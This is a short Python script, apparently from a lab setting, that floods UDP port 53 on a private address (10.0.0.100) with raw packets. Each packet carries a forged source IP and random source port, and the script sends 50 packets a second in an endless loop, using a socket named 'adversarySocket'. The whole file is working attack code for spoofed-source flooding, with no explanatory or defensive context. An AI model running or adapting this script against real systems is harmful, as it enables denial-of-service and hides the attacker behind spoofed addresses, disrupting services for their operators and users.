import socket
from random import randint
import time
from impacket import ImpactPacket 
import pdb

SERVER_ADDR = "10.0.0.100"
PORT = 53
PAYLOAD = 32


adversarySocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
adversarySocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
message = 'A' * PAYLOAD

ip = ImpactPacket.IP()
ip.set_ip_dst(SERVER_ADDR)

udp = ImpactPacket.UDP()
udp.set_uh_dport(PORT)
udp.contains(ImpactPacket.Data(message))

ip.contains(udp)

while (True):
	for i in range(50):
		udp.set_uh_sport(randint(50000, 60000))
		ip.set_ip_src('10.0.0.' + str(randint(1, 5)))
		adversarySocket.sendto(ip.get_packet(), (SERVER_ADDR, PORT))
	time.sleep(1)